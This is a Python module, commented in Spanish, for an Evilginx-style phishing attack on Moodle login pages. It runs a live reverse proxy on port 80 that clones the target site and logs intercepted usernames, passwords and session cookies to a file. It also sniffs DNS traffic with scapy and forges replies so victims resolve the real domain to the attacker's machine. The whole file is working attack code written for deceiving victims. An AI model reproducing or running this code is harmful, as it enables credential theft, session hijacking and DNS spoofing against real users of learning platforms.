"""
Módulo MOODLE_CAPTURE - Servidor de captura y spoofing DNS
"""

import threading
import socketserver
import http.server
import urllib.parse
from modulos.config import _estado, _dns_reglas, IP_LOCAL, PHISHING_PAGE_HTML

class MoodleCaptureModule:
    """Módulo para captura de credenciales via servidor HTTP falso."""
    
    def __init__(self, logger_engine):
        self.logger = logger_engine
        self._server = None
        self._server_thread = None
        self.target_url = ""
    
    def start_server(self, target_url, write_callback, stop_callback):
        """Inicia el servidor HTTP de captura (Proxy)."""
        if self._server is not None:
            write_callback("✗ El servidor ya está en ejecución.\n")
            return False
            
        self.target_url = target_url.rstrip("/")
        
        try:
            handler_cls = self._make_handler(write_callback)
            socketserver.TCPServer.allow_reuse_address = True
            srv = socketserver.TCPServer(("", 80), handler_cls)
            self._server = srv
            t = threading.Thread(target=srv.serve_forever, daemon=True)
            t.start()
            self._server_thread = t
            write_callback(f"✔ Proxy Evilginx activo en http://{IP_LOCAL}:80\n")
            write_callback(f"  ↬ Clonando en vivo: {self.target_url}\n")
            self.logger.log(f"[CAPTURA] Proxy HTTP puerto 80 -> {self.target_url}", "warn")
            return True
        except PermissionError:
            write_callback("✗ ERROR: Puerto 80 requiere privilegios de Administrador o ya está en uso.\n")
            self.logger.log("[CAPTURA] Error: sin permisos para puerto 80.", "err")
            self._server = None
            return False
        except Exception as e:
            write_callback(f"✗ Error iniciando servidor: {e}\n")
            self.logger.log(f"[CAPTURA] Error: {e}", "err")
            self._server = None
            return False
    
    def stop_server(self, write_callback):
        """Detiene el servidor HTTP."""
        if self._server is None:
            write_callback("✗ No hay servidor activo.\n")
            return
        
        try:
            self._server.shutdown()
            self._server.server_close()
        except Exception:
            pass
        self._server = None
        write_callback("● Servidor proxy de captura detenido.\n")
        self.logger.log("[CAPTURA] Servidor HTTP detenido.", "warn")
    
    def _make_handler(self, write_callback):
        """Crea y devuelve la clase handler HTTP con funcionalidad de Proxy Reverso."""
        logger = self.logger
        target = getattr(self, "target_url", "https://ejemplo.com")
        
        class DynamicProxyHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                pass  # Silenciar logs ruidosos
            
            def do_GET(self):
                self._proxy_request("GET")
            
            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length) if length > 0 else None
                
                # Interceptar cuerpos POST (credenciales)
                if body:
                    try:
                        texto = body.decode("utf-8", errors="ignore")
                        params = urllib.parse.parse_qs(texto)
                        user = params.get("username", params.get("user", params.get("email", params.get("log", [""]))))[0]
                        pwd  = params.get("password", params.get("pass", params.get("pwd", [""])))[0]
                        
                        if user and pwd:
                            msg = f"[!] LOGIN INTERCEPTADO: User: {user} | Pass: {pwd}"
                            logger.log(msg, "err")
                            write_callback("► " + msg + "\n")
                            # Guardar en archivo
                            try:
                                import os
                                os.makedirs("logs", exist_ok=True)
                                with open("logs/tokens.txt", "a", encoding="utf-8") as f:
                                    f.write(f"[CRED] {target} -> u:{user} p:{pwd}\n")
                            except Exception:
                                pass
                    except Exception:
                        pass
                
                self._proxy_request("POST", body)
                
            def _proxy_request(self, method, body=None):
                url = target + self.path
                
                # Excluir cabeceras incompatibles o problemáticas
                req_headers = {k: v for k, v in self.headers.items() 
                               if k.lower() not in ['host', 'accept-encoding', 'content-length']}
                
                try:
                    import requests
                    # Hacemos la petición al servidor original, deshabilitando SSL verify si hiciera falta
                    resp = requests.request(method, url, headers=req_headers, data=body, 
                                            allow_redirects=False, verify=False)
                except Exception as e:
                    self.send_error(502, f"Bad Gateway (Target inalcanzable)")
                    return
                
                self.send_response(resp.status_code)
                
                content = resp.content
                content_type = resp.headers.get("Content-Type", "")
                
                # SUB-FILTERS: Modificar HTML al vuelo para que los links apunten al proxy
                if "text/html" in content_type:
                    target_domain = urllib.parse.urlparse(target).netloc
                    if target_domain:
                        content = content.replace(target_domain.encode('utf-8'), IP_LOCAL.encode('utf-8'))
                
                for k, v in resp.headers.items():
                    if k.lower() in ["content-encoding", "transfer-encoding", "content-length"]:
                        continue
                    if k.lower() == "set-cookie":
                        self._capture_cookie(v)
                    self.send_header(k, v)
                
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                
                self.wfile.write(content)
                
            def _capture_cookie(self, cookie_str):
                criticas = ["session", "token", "moodle", "auth", "sid"]
                if any(c in cookie_str.lower() for c in criticas):
                    msg = f"[*] COOKIE SESIÓN CAPTURADA: {cookie_str[:50]}..."
                    logger.log(msg, "warn")
                    write_callback("  " + msg + "\n")
                    try:
                        import os
                        os.makedirs("logs", exist_ok=True)
                        with open("logs/tokens.txt", "a", encoding="utf-8") as f:
                            f.write(f"[COOKIE] {target} -> {cookie_str}\n")
                    except Exception:
                        pass
        
        return DynamicProxyHandler
    
    def activate_moodle_mode(self, target_url, write_callback):
        """Activa automáticamente: regla DNS dinámica → IP_LOCAL + servidor Proxy HTTP."""
        self.target_url = target_url.rstrip("/")
        target_domain = urllib.parse.urlparse(self.target_url).netloc
        if not target_domain:
            target_domain = self.target_url # fallback rough
            
        # 1. Añadir regla DNS dinámica
        _dns_reglas[target_domain] = IP_LOCAL
        write_callback(f"✔ Regla DNS automática: {target_domain} → {IP_LOCAL}\n")
        self.logger.log(f"[MOODLE] DNS: {target_domain} → {IP_LOCAL}", "warn")
        
        # 2. Activar DNS Spoofing si scapy está disponible
        scapy_available = False
        try:
            import scapy.all
            scapy_available = True
        except ImportError:
            pass
        
        if scapy_available and not _estado["dns"].is_set():
            _estado["dns"].set()
            threading.Thread(target=self._dns_loop, args=(write_callback,), daemon=True).start()
            write_callback("✔ DNS Spoofing iniciado automáticamente.\n")
        elif not scapy_available:
            write_callback("⚠ Scapy no disponible — DNS Spoofing omitido. El Proxy sí se activa.\n")
        
        # 3. Iniciar servidor Proxy de captura
        self.start_server(target_url, write_callback, lambda: None)
        write_callback("✔ Modo Evilginx Moodle activo. Engañando víctimas...\n")
        self.logger.log(f"[MOODLE] Evilginx Mode activado clonando {target_domain}.", "err")
    
    def _dns_loop(self, write_callback):
        """Loop de DNS spoofing para modo Moodle."""
        try:
            from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff
        except ImportError:
            return
        
        def proc(pkt):
            if not _estado["dns"].is_set(): 
                return
            if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0): 
                return
            nombre = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
            for dom, ip_f in _dns_reglas.items():
                if dom in nombre:
                    resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                            UDP(dport=pkt[UDP].sport, sport=53) /
                            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=ip_f)))
                    send(resp, verbose=0)
                    msg = f"  ↬ {nombre:<35} → {ip_f}\n"
                    write_callback(msg)
                    self.logger.log(f"[DNS] {nombre} → {ip_f}", "pkt")
                    return
        
        try:
            sniff(filter="udp port 53", prn=proc,
                  stop_filter=lambda _: not _estado["dns"].is_set(), store=False)
        except Exception as e:
            write_callback(f"✗ Error: {e}\n")
            self.logger.log(f"[DNS] Error: {e}", "err")
        finally:
            _estado["dns"].clear()
